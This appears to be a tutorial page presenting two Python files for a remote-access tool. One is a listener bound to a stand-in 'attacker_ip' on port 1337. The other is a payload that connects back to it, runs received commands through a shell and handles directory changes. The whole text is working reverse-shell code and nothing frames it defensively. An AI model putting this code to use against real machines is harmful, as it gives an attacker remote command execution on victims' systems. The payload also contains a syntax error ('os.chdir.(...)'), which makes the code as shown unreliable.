<h2 align="center">Handle Change Directory (cd) exceptions</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048) # data at instance
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
	cmd = input("enter a command: ")
	
	if cmd == "quit":
		connection.send(b"quit") # string
		connection.close()
		break

	elif cmd[:2] == "cd":
		connection.send(bytes(cmd, "utf-8"))
		recv = recv_data() # bytes
		print(recv.decode("utf-8"))
		continue
		
	connection.send(bytes(cmd, "utf-8"))
	
	output = recv_data()
	print(output.decode("utf-8"))

print("Server has stopped")
```
---
> [payload.py](payload.py)
```python

import socket
import subprocess

# import a library for change directory
import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	cmd = payload.recv(2048)
	cmd = cmd.decode("utf-8") # string
	
	if cmd == "quit": # no longer need to decode with byte
		payload.close()
		break
	
	elif cmd[:2] == "cd":
		# Handle Change Directory (cd) Exception
		try:
			os.chdir.(cmd[3:])
		except FileNotFoundError:
			send_data(b"File not found")
		else:
			send_data(b"Changed directory")
		continue

	try:
		output = subprocess.check_output(cmd, shell = True)
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")
	else:
		send_data(output)

print("Disconnected") # display disconnection message
```